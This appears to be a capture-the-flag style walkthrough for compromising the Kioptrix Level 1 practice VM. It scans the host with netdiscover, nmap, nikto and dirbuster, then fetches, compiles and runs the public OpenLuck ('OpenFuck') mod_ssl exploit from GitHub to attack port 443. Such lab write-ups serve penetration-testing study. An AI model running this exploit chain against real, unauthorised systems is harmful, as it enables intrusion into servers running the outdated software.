## Below are the Steps for hacking the Kioptrix Level 1 VM



**$yourip = Your IP Address (Found using ifconfig)**

**$ip = Kioptrix's machine**

Run the command below to find the Kioptrix VM's IP Address:

```bash
netdiscover -r $yourip/24 
```

To find available ports:
```bash
nmap -T4 -p- $ip
```
```
Results:

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm
```


A more advanced scan using the available ports
```bash
nmap -A -T4 -p22,80,111,139,443,1024 $ip
```

To find any vulnerabilities on the http page/port:
```bash
nikto -h $ip
```

Ran dirbuster to list hidden directories by brute force:
```bash
dirbuster
```
Took the "mod_ssl/2.8.4 appears to be outdated" from Nikto output and searched through [exploit.db.](https://www.exploit-db.com/exploits/47080)

Found the updated Github page [OpenFuck](https://github.com/heltonWernik/OpenLuck) and cloned the repo:
```bash
git clone https://github.com/heltonWernik/OpenLuck.git
```

Compiled the code through running gcc:
```bash
gcc OpenFuck.c -o OpenFuck -lcrypto
```
Ran the exploit:
```bash
./OpenFuck 0x6b $ip 443 -c 40
```
**0x6b** is the code for the *OS (Red Hat Linux)*
**-c** is for the *possible connection count range*
